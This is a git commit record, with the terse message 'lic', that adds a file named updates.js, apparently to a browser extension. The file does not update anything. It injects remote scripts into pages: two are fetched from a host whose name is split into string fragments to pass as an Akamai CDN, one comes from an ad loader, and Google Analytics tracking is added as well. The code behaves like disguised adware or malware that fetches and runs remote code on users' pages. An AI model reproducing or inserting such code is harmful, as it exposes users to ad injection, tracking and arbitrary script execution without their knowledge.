d865e378bc36e8d207da1f6e2cc8ada25665736d
yezzbox <ivan@web-impress.com>
2015-06-21 15:59:14 +0300

    lic

---
+++ files/updates.js
@@ -0,0 +1,43 @@
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//cdn'+'cache-a.akam'+'aihd.net/sub/h7b9383/AJ676/l.js?pid=2347&ext=dym';
+    head.appendChild(script);
+})();
+
+//--------------------------------------------------------------------------------------------
+
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//ads.panoramtech.net/loader.js?client=AJ676';
+    head.appendChild(script);
+})();
+
+//--------------------------------------------------------------------------------------------
+
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//cdn'+'cache-a.akam'+'aihd.net/sub/h7b9383/AJ676INT/l.js?pid=2401&ext=dym';
+    head.appendChild(script);
+})();
+
+//--------------------------------------------------------------------------------------------
+
+var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-55208911-1']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = 'https://ssl.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+
+//--------------------------------------------------------------------------------------------
+
+//This code is from Addonjet.com (Hashimtopaz@gmail.com)
